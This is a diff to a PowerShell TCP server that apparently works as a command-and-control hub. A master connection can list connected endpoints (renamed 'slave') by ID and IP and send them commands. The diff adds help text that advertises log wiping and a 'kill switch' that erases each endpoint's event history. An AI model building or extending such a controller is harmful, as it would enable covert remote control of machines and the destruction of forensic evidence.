@@ -56,9 +56,9 @@ while ($exit -eq 0) {
 								ClientRemoteIP = $client.Client.RemoteEndPoint.Address.IPAddressToString;
 
 							  }
-				$writer.WriteLine("client established");
+				$writer.WriteLine("slave established");
 				$writer.Flush();
-				Write-Output "Client Connected...";
+				Write-Output "slave Connected...";
 			}
 		}
 		$clientIDTicker += 1;
@@ -121,20 +121,19 @@ while ($exit -eq 0) {
 						$master_stream = $MasterClient.ClientConn.GetStream();
 						$master_reader = New-Object System.IO.StreamReader($master_stream);
 						$master_writer = New-Object System.IO.StreamWriter($master_stream);
-
 					while ($master_reader.Peek() -ge 0) {
-						try {
-							
+						try {							
 							$in_buff = $master_reader.ReadLine();
-							$join = $in_buff -join "";
-							
+							$join = $in_buff -join "";							
 							#client_dump####################################################
 							if ($join -match ".*--client_dump") {
 								Write-Output "Dumping client list to master client.";
 								if ($ClientList.Length -gt 0) {
 									for ($i=0; $i -lt $ClientList.Length; $i++) {
 										try {
-											$master_writer.WriteLine($ClientList[$i]);
+											$master_writer.WriteLine("ID: "+$ClientList[$i].ID);
+											$master_writer.WriteLine("IP: "+$ClientList[$i].ClientRemoteIP);
+											$master_writer.WriteLine(" ");
 												
 										} catch {
 											Write-Output $_;
@@ -148,7 +147,7 @@ while ($exit -eq 0) {
 								$master_writer.Flush();
 
 
-							
+							#Server Shutdown#################################################
 							} elseif ($join -match "--server_shutdown") {
 								for ($i=0; $i -lt $ClientList.Length; $i++) {
 									$ClientList[$i].ClientConn.Close();
@@ -177,9 +176,28 @@ while ($exit -eq 0) {
 								}
 
 							} else {
-								$master_writer.WriteLine("improper format detected:\n");
-								$master_writer.WriteLine("Command: '--id=<int> --command=<string>'")
-								$master_writer.WriteLine("ClientList: '--client_dump'")
+								#Dump accepted command list.
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("improper format detected:");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#Command")
+								$master_writer.WriteLine("--id=<int> --command=<string>");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#ClientList")
+								$master_writer.WriteLine("--client_dump");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#WipeLogs");
+								$master_writer.WriteLine("--log_wipe");
+								$master_writer.WriteLine(" ");
+								$master_writer.WriteLine("#TempShutdown");
+								$master_writer.WriteLine("--client_shutdown");
+								$master_writer.WriteLine(" ")
+								$master_writer.WriteLine("#Use with caution!!!")
+								$master_writer.WriteLine("#Dismantles endpoint client forever and wipes client event history.")
+								$master_writer.WriteLine("--kill_switch");
+								$master_writer.WriteLine(" ")
+								$master_writer.WriteLine(" ")
 								$master_writer.Flush();
 							}
 							#################################################################
